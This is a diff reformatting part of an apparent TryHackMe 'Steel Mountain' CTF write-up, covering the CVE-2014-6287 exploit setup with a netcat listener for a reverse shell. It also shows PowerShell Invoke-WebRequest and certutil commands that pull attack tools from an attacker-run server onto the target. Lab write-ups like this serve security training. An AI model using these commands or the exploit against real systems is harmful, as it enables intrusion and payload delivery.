@@ -143,7 +143,7 @@ In this section, instead of using Metasploit and automatizing the process, we wi
 <br><br>Your directory should look like this
 <br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/20.jpg){:.normal}<br><br>
 ## 2-Exploitation
-Edit the **cve20146287.py** file, set the `ip_addr` field to your THM IP, and set the `local_port` to any free port.
+Edit the **cve20146287.py** file, set the **ip_addr** field to your THM IP, and set the **local_port** to any free port.
 <br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/25.jpg){:.normal}<br><br>
 
 Start a **netcat** listener on the port you declared in the **python** file.
@@ -153,8 +153,15 @@ Start a **netcat** listener on the port you declared in the **python** file.
 
 <br>It is possible to use PowerUp.ps1 again or **winPEAS.bat** can be used to enumerate misconfigurations.
 <br>You can download any file from the running python server by using one of these utilites.
-<br>-> `powershell -c "Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"`
-<br>-> `certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}`
+
+{% highlight powershell %}
+powershell -c "Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"
+{% endhighlight %}
+
+{% highlight powershell %}
+certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}
+{% endhighlight %}
+
 <br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg){:.normal}<br><br>
 As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on **Advanced System Care9**
 service and many others.
